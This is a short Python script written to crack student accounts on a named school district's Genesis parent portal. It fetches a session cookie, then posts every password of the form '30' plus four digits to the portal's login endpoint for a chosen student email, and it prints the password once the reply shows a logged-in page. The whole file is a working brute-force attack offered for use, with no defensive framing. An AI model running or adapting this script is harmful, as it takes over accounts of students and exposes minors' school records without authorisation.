import requests  # Import needed module

url      = 'https://parents.genesisedu.com/bernardsboe/sis/j_security_check'  # define api uri
checkUrl = 'https://parents.genesisedu.com/bernardsboe/sis/view?gohome=true'  # Define

# Put student Email here (ex: example@bernardsboe.com)
email = ''

assert email != '' # Dont run if email is empty
print(f'[*] Starting Crack for {email}')  # Print email to crack

for i in range(9999):  # Loop through possible passwords
    toTry = f'30{str(i).zfill(4)}'  # Create password to try (ex: 300736)
    print(f'[*] Trying [{toTry}]')  # print what password is being tried
    # Create new session to hold cookies
    ses = requests.Session()
    # Let server Create cookies needed to proform exploit (JSESSIONID)
    ses.get(checkUrl)
    # Get Data to send
    dataToSend = {"j_password": toTry, "j_username": email}
    # Try Password
    data = ses.post(url, data=dataToSend)
    # Check if is correct password
    if not "Account is inactive" in data.text and not "workStudentId" in data.text:
        continue
    print(f'\n[*] Complete: {toTry}')  # if passwords is correct print it
    break  # Exit the loop when the password has been found
